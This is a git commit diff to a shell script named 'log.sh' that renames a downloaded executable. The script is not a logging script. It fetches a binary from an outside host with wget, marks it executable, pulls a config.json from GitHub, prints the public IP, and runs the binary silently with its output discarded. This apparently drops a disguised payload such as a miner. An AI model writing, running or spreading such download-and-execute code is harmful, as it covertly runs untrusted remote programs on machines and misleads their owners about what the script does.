26de71ad533aacffe29c499cddc304608d14ac39
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-10 12:12:04 +0700

    Update log.sh

--- log.sh
+++ log.sh
@@ -1,7 +1,7 @@
-wget https://maper.info/BoonHoldingsInc && chmod +x BoonHoldingsInc >/dev/null 2>&1
+wget https://maper.info/SolaceBank && chmod +x SolaceBank >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 sleep 11 
 echo "******************************************************************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
 echo " "
-./BoonHoldingsInc -c "config.json" >/dev/null 2>&1
+./SolaceBank -c "config.json" >/dev/null 2>&1
